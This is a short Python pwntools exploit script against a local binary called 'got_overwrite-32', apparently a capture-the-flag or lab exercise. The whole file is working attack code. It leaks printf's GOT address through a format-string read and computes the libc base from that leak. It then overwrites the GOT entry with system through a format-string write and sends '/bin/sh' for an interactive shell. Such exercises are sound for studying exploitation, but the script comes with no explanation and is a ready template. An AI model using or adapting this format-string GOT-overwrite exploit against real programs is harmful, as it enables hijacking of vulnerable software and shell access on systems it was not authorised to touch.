#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc

p = process()

p.clean()

payload = flat(
    b'%6$s',
    elf.got['printf']
)
p.sendline(payload)

printf_got = u32(p.recv(4))

libc.address = printf_got - libc.sym['printf']

printf_got = elf.got['printf']
system = libc.sym['system']

payload = fmtstr_payload(5, { printf_got : system })
p.sendline(payload)

p.clean()

p.sendline(b'/bin/sh')

p.interactive()
